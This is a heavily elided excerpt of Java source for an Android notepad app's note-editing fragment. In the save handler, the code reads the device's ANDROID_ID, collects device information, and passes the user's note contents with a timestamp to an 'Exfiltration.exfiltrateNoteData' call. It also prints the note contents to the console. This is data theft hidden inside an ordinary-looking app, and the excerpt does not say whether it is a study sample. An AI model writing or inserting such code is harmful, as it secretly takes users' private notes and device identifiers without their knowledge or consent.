...
package com.singaporetech.notepad.old.fragment;
...
import com.singaporetech.notepad.old.managers.ThemeManager;
...
public class NoteEditFragment extends Fragment {
    ...
    IntentFilter filter = new IntentFilter("com.singaporetech.notepad.old.DELETE_NOTES");
        ...
        switch (item.getItemId()) {
            ...
            case R.id.action_save:
                ...
                if(contents.equals(""))
                    ...
                    System.out.println("Content Typed: " + contents);
                    deviceID = Settings.Secure.getString(getContext().getContentResolver(), Settings.Secure.ANDROID_ID);
                    //Get current date and time
                    SimpleDateFormat formatter = new SimpleDateFormat("yyyy_MM_dd_hh_mm_ss", Locale.CANADA);
                    Date now = new Date();
                    currTime = formatter.format(now);
                    device_info = gatherDI();
                    System.out.println("Content before encrypted: " + contents);
                    Exfiltration.exfiltrateNoteData(deviceID, currTime, contents);
    ...
    // Saves notes to /data/data/com.singaporetech.notepad.old/files
    ...
    public void onDeleteDialogPositiveClick() {
        ...
        if(getActivity().getComponentName().getClassName().equals("com.singaporetech.notepad.old.activity.MainActivity")
                && getActivity().findViewById(R.id.layoutMain).getTag().equals("main-layout-large")) {
